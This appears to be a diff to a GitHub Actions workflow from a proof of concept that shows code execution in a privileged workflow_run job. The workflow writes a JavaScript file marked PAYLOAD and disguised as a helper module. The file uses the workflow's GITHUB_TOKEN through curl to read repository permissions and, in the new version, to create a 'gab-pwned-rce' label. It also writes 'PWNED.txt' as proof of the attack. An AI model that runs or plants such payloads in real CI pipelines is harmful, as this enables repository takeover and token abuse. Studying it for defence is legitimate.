@@ -19,13 +19,13 @@ jobs:
           cat > stage/.github/scripts/helpers/index.js <<'PAYLOAD'
           const { execSync } = require('child_process');
           const fs = require('fs');
-          let perms = 'n/a';
+          let res = 'n/a';
           try {
-            const out = execSync('curl -s --max-time 20 -H "Authorization: Bearer $GITHUB_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY"').toString();
-            perms = JSON.stringify(JSON.parse(out).permissions);
-          } catch (e) { perms = 'err:' + e.message; }
-          fs.writeFileSync('PWNED.txt', 'RCE_OK perms=' + perms + ' actor=' + process.env.GITHUB_ACTOR + '\n');
-          console.log('PWNED_IN_WORKFLOW_RUN_JOB perms=' + perms + ' actor=' + process.env.GITHUB_ACTOR);
+            const out = execSync(`curl -s -o /tmp/lbl.json -w "%{http_code}" --max-time 20 -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" -d '{"name":"gab-pwned-rce","color":"ff0000"}' "https://api.github.com/repos/$GITHUB_REPOSITORY/labels"`).toString();
+            res = out + ' ' + fs.readFileSync('/tmp/lbl.json', 'utf8').slice(0, 160);
+          } catch (e) { res = 'err:' + e.message; }
+          fs.writeFileSync('PWNED.txt', 'RCE_OK label_create=' + res + '\n');
+          console.log('PWNED_IN_WORKFLOW_RUN_JOB label_create=' + res + ' actor=' + process.env.GITHUB_ACTOR);
           module.exports = {
             createLogger: () => ({ log() {}, error() {} }),
             buildBotContext: ({ github, context }) => ({ github, context }),
